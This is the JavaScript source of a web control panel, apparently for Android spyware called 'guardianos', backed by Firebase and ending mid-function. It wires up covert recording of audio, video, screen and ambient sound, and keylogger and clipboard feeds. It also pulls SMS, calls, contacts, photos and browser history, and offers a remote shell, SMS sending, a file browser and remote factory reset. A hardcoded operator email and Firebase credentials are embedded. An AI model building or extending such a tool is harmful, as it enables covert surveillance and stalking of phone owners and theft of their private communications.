import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js';
import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js';
import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';

const firebaseConfig = {
    apiKey: "AIzaSyBhaPM20tIhMalxLjoCklmwy4qb1ZkraSo",
    authDomain: "guardianos-30b18.firebaseapp.com",
    projectId: "guardianos-30b18",
    storageBucket: "guardianos-30b18.appspot.com",
    messagingSenderId: "323558398331",
    appId: "1:323558398331:android:a022a1e38b48a0247705de",
    databaseURL: "https://guardianos-30b18-default-rtdb.europe-west1.firebasedatabase.app"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);
const storage = getStorageInstance(app);

let currentUser = null;
let selectedDevice = null;
let allDevices = [];
let deviceListeners = {};
const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";

const noDeviceAlert = document.getElementById('no-device-alert');
const deviceDashboard = document.getElementById('device-dashboard');
const devicesList = document.getElementById('devices-list');
const deviceCount = document.getElementById('device-count');
const logoutBtn = document.getElementById('btn-logout');
const refreshDevicesBtn = document.getElementById('btn-refresh-devices');

onAuthStateChanged(auth, (user) => {
    if (user && user.email?.toLowerCase() === ALLOWED_OPERATOR_EMAIL.toLowerCase()) {
        currentUser = user;
        console.log("👤 Operator logged in:", user.email);
        loadAllDevices();
    } else {
        console.log("⛔ Access denied");
        window.location.href = './index.html';
    }
});

function loadAllDevices() {
    const devicesRef = ref(database, 'devices');
    onValue(devicesRef, (snapshot) => {
        allDevices = [];
        if (snapshot.exists()) {
            const data = snapshot.val();
            Object.keys(data).forEach(deviceUid => {
                const d = data[deviceUid];
                const model = d.identity?.model || "Unknown Model";
                const customName = d.identity?.custom_name || d.deviceName || "Unknown Device";
                allDevices.push({
                    uid: deviceUid,
                    name: `${customName} (${model})`,
                    battery: d.battery_level || d.status?.batteryPercentage || 0,
                    lastSeen: d.last_seen || d.status?.last_seen || 0,
                    online: (Date.now() - (d.last_seen || d.status?.last_seen || 0)) < 300000,
                    lat: d.location?.lat || d.status?.latitude || 0,
                    lng: d.location?.lng || d.status?.longitude || 0
                });
            });
            renderDevicesList();
            if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
        } else { showNoDeviceAlert(); }
    });
}

function renderDevicesList() {
    devicesList.innerHTML = '';
    deviceCount.textContent = allDevices.length;
    allDevices.forEach(device => {
        const item = document.createElement('div');
        item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
        item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%</div></div>`;
        item.addEventListener('click', () => selectDevice(device.uid));
        devicesList.appendChild(item);
    });
    if (allDevices.length === 0) showNoDeviceAlert();
    else { noDeviceAlert.style.display = 'none'; deviceDashboard.style.display = 'block'; }
}

function selectDevice(deviceUid) {
    selectedDevice = deviceUid;
    renderDevicesList();
    noDeviceAlert.style.display = 'none';
    deviceDashboard.style.display = 'block';
    injectAdvancedControls();
    Object.keys(deviceListeners).forEach(key => { try { off(deviceListeners[key]); } catch(e) {} });
    deviceListeners = {};
    loadDeviceData(deviceUid);
    setupCommandListeners(deviceUid);
}

function injectAdvancedControls() {
    if (document.getElementById('cmd-audio')) return;
    const matrix = document.querySelector('.card-grid');
    if (!matrix) return;
    const parentGrid = matrix.closest('.dashboard-grid-container');
    const controlMatrixCard = matrix.closest('.crypto-card');

    matrix.appendChild(createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF'));
    matrix.appendChild(createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF'));
    matrix.appendChild(createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF'));
    matrix.appendChild(createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF'));

    matrix.appendChild(createSectionHeader('📊 DATA EXTRACTION'));
    matrix.appendChild(createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF'));
    matrix.appendChild(createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER'));

    matrix.appendChild(createSectionHeader('🎮 REMOTE CONTROL'));
    matrix.appendChild(createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER'));
    matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));

    matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
    const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); uninst.style.borderColor = '#ff6b6b'; matrix.appendChild(uninst);
    const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); rebot.style.borderColor = '#ff6b6b'; matrix.appendChild(rebot);
    const shutd = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER'); shutd.style.borderColor = '#ff6b6b'; matrix.appendChild(shutd);
    const factr = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER'); factr.style.borderColor = '#ff0000'; matrix.appendChild(factr);
    const lockn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER'); lockn.style.borderColor = '#ff6b6b'; matrix.appendChild(lockn);

    const timeW = document.createElement('div'); timeW.className = 'time-control-wrapper';
    timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
    controlMatrixCard.after(timeW);

    const shellW = document.createElement('div'); shellW.className = 'shell-control-wrapper';
    shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;background:#050510;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;font-family:'Courier New',monospace;line-height:1.5;border:1px solid #1a3a1a;"></pre>`;
    timeW.after(shellW);

    const smsW = document.createElement('div'); smsW.className = 'shell-control-wrapper';
    smsW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-paper-plane"></i> SEND SMS</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="text" id="sms-number" placeholder="+256700123456" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><input type="text" id="sms-body" placeholder="Message text..." style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SEND</button></div>`;
    shellW.after(smsW);

    const fileW = document.createElement('div'); fileW.className = 'shell-control-wrapper';
    fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><div id="file-output" style="display:none;background:#050510;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:500px;overflow:auto;line-height:1.6;"></div>`;
    smsW.after(fileW);

    const geoW = document.createElement('div'); geoW.className = 'shell-control-wrapper';
    geoW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button><button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button></div>`;
    fileW.after(geoW);

    const dp = document.createElement('div'); dp.className = 'data-panels-grid';
    dp.innerHTML = `
        <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div><div class="data-panel-body" id="calls-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div><div class="data-panel-body" id="contacts-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
        <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">📊 Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
        <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
        <div class="data-panel"><div class="data-panel-header">⚡ Device Control</div><div class="data-panel-body" id="devicecontrol-feed">Waiting for data...</div></div>`;
    parentGrid.appendChild(dp);
}

function createMatrixBtn(id, icon, label, stateText) {
    const btn = document.createElement('button');
    btn.id = id; btn.className = 'matrix-btn toggle-btn';
    btn.innerHTML = `<i class="fa-solid ${icon}"></i><span>${label}</span><span class="toggle-state">${stateText}</span>`;
    return btn;
}
function createSectionHeader(title) {
    const h = document.createElement('div'); h.className = 'section-header';
    h.innerHTML = `<h3>${title}</h3>`; return h;
}

function loadDeviceData(uid) {
    const device = allDevices.find(d => d.uid === uid);
    if (!device) return;
    document.getElementById('selected-device-name').textContent = device.name;
    initializeTelemetryStream(uid);
    initializeCommandStateListeners(uid);
    initializeDataFeedListeners(uid);
}

function initializeTelemetryStream(uid) {
    const statusRef = ref(database, `devices/${uid}/status`);
    if (deviceListeners[`status-${uid}`]) off(deviceListeners[`status-${uid}`]);
    deviceListeners[`status-${uid}`] = onValue(statusRef, (snap) => {
        if (!snap.exists()) return;
        const d = snap.val();
        if (document.getElementById('battery-text')) {
            document.getElementById('battery-text').textContent = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
            const bar = document.getElementById('battery-bar');
            if (bar) bar.style.width = `${d.batteryPercentage || 0}%`;
        }
        if (document.getElementById('latitude-text') && d.latitude != null) {
            document.getElementById('latitude-text').textContent = parseFloat(d.latitude).toFixed(6);
            document.getElementById('longitude-text').textContent = parseFloat(d.longitude).toFixed(6);
            const ml = document.getElementById('map-link');
            if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
        }
        const ls = document.getElementById('last-seen-text');
        if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();

        const img = document.getElementById('cameraPreviewFrame');
        const vid = document.getElementById('mediaVideoPlayer');
        const aud = document.getElementById('mediaAudioPlayer');
        const audC = document.getElementById('audio-container');
        const ph = document.getElementById('mediaPlaceholderText');
        const ts = document.getElementById('captureTimestamp');
        const hideAll = () => { if(img) img.style.display='none'; if(vid){vid.style.display='none';vid.pause();} if(aud){aud.style.display='none';aud.pause();} if(audC) audC.style.display='none'; if(ph) ph.style.display='block'; };

        const photoUrl = d.lastPhotoUrl || d.last_photo_url;
        const videoUrl = d.lastVideoUrl || d.last_video_url;
        const audioUrl = d.lastAudioUrl || d.last_audio_url;
        let active = false;

        if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
        else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
        else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }

        if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
        else if (!active && ph) ph.style.display = 'block';
    });
}

function initializeCommandStateListeners(uid) {
    const commandsRef = ref(database, `devices/${uid}/commands`);
    deviceListeners[`commands-${uid}`] = onValue(commandsRef, (snap) => {
        const cmd = snap.val() || {};
        updateButtonState('cmd-flashlight', cmd.flashlight);
        updateButtonState('cmd-alarm', cmd.alarm);
        updateButtonState('cmd-lock', cmd.emergencyLock);
        updateButtonState('cmd-audio', cmd.record_audio);
        updateButtonState('cmd-video', cmd.record_video);
        updateButtonState('cmd-ambient', cmd.start_ambient);
        updateButtonState('cmd-screenrec', cmd.record_screen);
        updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
        const ti = document.getElementById('time-setter');
        if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
    });
}

function initializeDataFeedListeners(uid) {
    listenToFeed(uid, 'sms', (d) => {
        const msgs = d.messages || []; const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
        const f = document.getElementById('sms-feed'); if(!f) return;
        if(!msgs.length){f.innerHTML='No SMS data yet';return;}
        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
    });
    listenToFeed(uid, 'sms_live', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
        const f = document.getElementById('sms-feed'); if(!f||!items.length) return;
        f.innerHTML = items.map(m=>`<div class="feed-item live-item">🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('') + f.innerHTML;
    });
    listenToFeed(uid, 'call_log', (d) => {
        const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
        const f = document.getElementById('calls-feed'); if(!f) return;
        if(!calls.length){f.innerHTML='No call data yet';return;}
        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
    });
    listenToFeed(uid, 'calls_live', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
        const f = document.getElementById('calls-feed'); if(!f||!items.length) return;
        f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
    });

    // ── CONTACTS — ALL contacts, grouped by name, sorted A-Z ──
    listenToFeed(uid, 'contacts', (d) => {
        const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
        const f = document.getElementById('contacts-feed'); if(!f) return;
        if(!ct.length){f.innerHTML='No contact data yet';return;}
        var grouped = {};
        ct.forEach(function(c) {
            var name = c.name || 'Unknown';
            if(!grouped[name]) grouped[name] = [];
            var num = c.number || '';
            var typ = c.type || '';
            var exists = grouped[name].some(function(n){return n.number===num && n.type===typ;});
            if(!exists) grouped[name].push({number:num, type:typ});
        });
        var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
        var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
        names.forEach(function(name) {
            var nums = grouped[name];
            var numHtml = nums.map(function(n){return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';}).join('<br>');
            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
        });
        f.innerHTML = html;
    });

    listenToFeed(uid, 'wifi', (d) => {
        const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
        const f = document.getElementById('wifi-feed'); if(!f) return;
        let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
        f.innerHTML = h;
    });
    listenToFeed(uid, 'installed_apps', (d) => {
        const apps = d.apps||[]; const c = document.getElementById('apps-count'); if(c) c.textContent = apps.length;
        const f = document.getElementById('apps-feed'); if(!f) return;
        if(!apps.length){f.innerHTML='No app data yet';return;}
        const ua = apps.filter(a=>!a.is_system); const sa = apps.filter(a=>a.is_system);
        let h = `<div class="feed-item" style="color:#00ff88;">📦 ${ua.length} user apps • ${sa.length} system apps</div>`;
        h += ua.slice(0,50).map(a=>`<div class="feed-item"><strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small></div>`).join('');
        f.innerHTML = h;
    });
    listenToFeed(uid, 'device_info', (d) => {
        const f = document.getElementById('deviceinfo-feed'); if(!f) return;
        const rows = [['Model',d.model],['Brand',d.brand],['Android',d.android_version],['SDK',d.sdk_version],['Storage',`${d.storage_used_percent||'?'}% used (${d.storage_free_gb||'?'}GB free)`],['RAM',`${d.ram_available_mb||'?'}MB / ${d.ram_total_mb||'?'}MB`],['Carrier',d.carrier],['Network',d.network_type],['Wi-Fi',d.wifi_ssid],['IP',d.wifi_ip],['Screen',`${d.screen_width}x${d.screen_height}`],['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]];
        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
    });
    listenToFeed(uid, 'battery_current', (d) => {
        const f = document.getElementById('battery-feed'); if(!f) return;
        const rows = [['Level',`${d.level_percent||'?'}%`],['Status',d.status],['Health',d.health],['Temp',`${d.temperature_c||'?'}°C`],['Voltage',`${d.voltage_mv||'?'}mV`],['Source',d.charge_source],['Tech',d.technology]];
        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
    });

    // ── KEYLOGGER — User Input vs Device Output, deduplicated ──
    listenToFeed(uid, 'keylog', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
        const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
        const f = document.getElementById('keylog-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}

        var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui',
            'com.samsung.android.app', 'com.google.android', 'android',
            'com.samsung.android.dialer'];

        var grouped = [];
        var prev = null;
        items.forEach(function(k) {
            var app = k.app || 'unknown';
            var text = (k.text || '').trim();
            if(!text) return;
            if(text.replace(/[\u200B-\u200D\uFEFF]/g, '').length === 0) return;

            var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });
            var isDuplicate = prev && prev.app === app && prev.text === text &&
                              (k.timestamp - prev.timestamp) < 2000;

            if(!isDuplicate) {
                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event});
            }
            prev = {app: app, text: text, timestamp: k.timestamp};
        });

        var display = grouped.slice(0, 60);
        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events (deduplicated) — <span style="color:#4ecdc4;">⌨️ USER</span> = typed input, <span style="color:#ffd93d;">🖥️ DEVICE</span> = screen output</div>';

        display.forEach(function(k) {
            var icon = k.isSystem ? '🖥️' : '⌨️';
            var label = k.isSystem ? 'DEVICE' : 'USER';
            var color = k.isSystem ? '#ffd93d' : '#4ecdc4';
            var bgColor = k.isSystem ? 'rgba(255,217,61,0.05)' : 'rgba(78,205,196,0.05)';
            var borderColor = k.isSystem ? '#ffd93d' : '#4ecdc4';

            var appName = k.app.split('.').pop() || k.app;
            if(appName === 'whatsapp') appName = 'WhatsApp';
            else if(appName === 'dialer') appName = 'Phone';
            else if(appName === 'yantra') appName = 'Terminal';
            else if(appName === 'biometrics') appName = 'Biometric';
            else if(appName === 'setting') appName = 'Settings';
            else if(appName === 'app') appName = 'Samsung';

            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
            html += '</div>';
            html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
            html += '</div>';
        });

        f.innerHTML = html;
    });

    listenToFeed(uid, 'geofence_alerts', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
        const f = document.getElementById('geofence-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No geofence alerts';return;}
        f.innerHTML = items.map(g=>{const i=g.event==='LEFT'?'🚨':'✅';return `<div class="feed-item ${g.event==='LEFT'?'alert-item':''}">${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}</div>`;}).join('');
    });
    listenToFeed(uid, 'clipboard', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
        const f = document.getElementById('clipboard-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No clipboard data yet';return;}
        f.innerHTML = items.map(c=>`<div class="feed-item"><small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code></div>`).join('');
    });
    listenToFeed(uid, 'clipboard_current', (d) => {
        const f = document.getElementById('clipboard-feed'); if(!f||!d||!d.text) return;
        f.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code></div>` + f.innerHTML;
    });
    listenToFeed(uid, 'browser_history', (d) => {
        const h = d.history||[]; const f = document.getElementById('browser-feed'); if(!f) return;
        if(!h.length){f.innerHTML='No browser history yet';return;}
        f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
    });

    // ── GALLERY WITH REAL IMAGE THUMBNAILS ───────────
    listenToFeed(uid, 'gallery_list', (d) => {
        const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
        if(d.status==='loading') {
            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
            html += p.slice(0,10).map(p => {
                const thumb = p.thumbnail_url || '';
                const imgHtml = thumb
                    ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">`
                    : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
                return `<div class="feed-item">${imgHtml}<small>${esc(p.name||'')} • ${(p.size_kb||0)}KB</small></div>`;
            }).join('');
            f.innerHTML = html;
            return;
        }
        if(!p.length){f.innerHTML='No gallery data yet';return;}
        f.innerHTML = p.slice(0,30).map(p => {
            const thumb = p.thumbnail_url || '';
            const imgHtml = thumb
                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
                   <div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div>`
                : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
            return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
        }).join('');
    });

    // ── SHELL OUTPUT (styled terminal) ───────────────
    listenToFeed(uid, 'shell_output', (d) => {
        const o = document.getElementById('shell-output'); if(!o||!d) return;
        o.style.display = 'block';
        let text = '$ ' + (d.command||'') + '\n\n';
        if(d.exit_code === -999) {
            text += '⏳ Executing...\n';
        } else {
            text += (d.stdout || '(no output)');
            if(d.stderr) text += '\n\nSTDERR:\n' + d.stderr;
            text += '\n\nExit code: ' + (d.exit_code ?? '?');
            if(d.timed_out) text += ' ⚠️ TIMED OUT';
        }
        o.textContent = text;
        o.scrollTop = o.scrollHeight;
    });

    // ── FILE BROWSER WITH NAVIGATION + IMAGE/VIDEO PREVIEWS ─
    listenToFeed(uid, 'file_browser', (d) => {
        const o = document.getElementById('file-output'); if(!o||!d) return;
        o.style.display = 'block';

        if(d.error) {
            o.innerHTML = '<span style="color:#ff6b6b;">❌ ' + esc(d.error) + '</span>';
            return;
        }

        if(d.is_file) {
            let html = '<div style="margin-bottom:10px;">';
            if(d.preview_url) {
                var isVid = (d.file_type === 'video');
                html += '<div style="position:relative;display:inline-block;cursor:pointer;" onclick="openPreview(this.querySelector(\'img\').src)">';
